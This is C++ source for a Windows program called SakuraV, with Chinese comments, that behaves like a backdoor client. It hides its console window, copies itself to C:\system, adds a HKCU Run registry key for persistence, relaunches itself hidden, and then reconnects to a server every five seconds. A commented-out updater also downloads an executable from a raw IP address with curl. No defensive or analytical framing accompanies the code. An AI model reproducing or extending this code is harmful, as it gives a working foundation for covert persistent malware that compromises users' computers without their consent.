#include <windows.h>
#include <iostream>
#include <cstdio>
#include <string>
#include <filesystem>
#include <fstream>
#include <shellapi.h>
#include "SakuraV.h"


// 自动更新的废案
/*bool update() {
	std::string update_server = "http://13.211.201.217:8001/";
	std::string command = "curl -O " + update_server + "info.txt";
	system(command.c_str());
	std::ifstream file(".\\info.txt");
	std::stringstream buffer;
	buffer << file.rdbuf();
	std::string version = buffer.str();
	if (version != "1000\n") {
		command = "curl -O " + update_server + "SakuraV1.exe";
		std::ofstream outfile("needupdate.txt");
		outfile.close();
		system("del /f \"info.txt\"");
		return true;
	}
	system("del /f \"info.txt\"");
	return false;

}*/

//获取当前目录
std::string GetDir() {
	char buffer[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, buffer, MAX_PATH);
	if (len == 0 || len == MAX_PATH) return "";
	return std::string(buffer);
}

//添加自启动
void start_opening() {
	
	std::string path = GetDir();
	std::string command = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SakuraV /t REG_SZ /d C:\\system\\SakuraV.exe /f";
	system(command.c_str());
	return;
}

//复制自己
bool copy_me(const std::filesystem::path dst) {
	 

	 std::filesystem::path src = GetDir();
	 try {
		 std::filesystem::copy_file(src, dst, std::filesystem::copy_options::overwrite_existing);
		 return true;
	 }
	 catch (const std::filesystem::filesystem_error& e) {
		 std::cout << e.what() << std::endl;
		 return false;
	 }
	
}

int main() {
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	std::string path = GetDir();
	if (path !="C:\\system\\SakuraV.exe") {
		if (!std::filesystem::exists("C:\\system")) {
			std::filesystem::create_directory("C:\\system");
		}
		bool is_ok = copy_me("C:\\system\\SakuraV.exe");
		start_opening();
		HINSTANCE result = ShellExecuteA(NULL, "open", "C:\\system\\SakuraV.exe", NULL, "C:\\system\\", SW_HIDE);
		return 0;
	}

	//循环连接服务器
	while (true) {
		start_connect();
		Sleep(5000);
	}
	return 0;

}
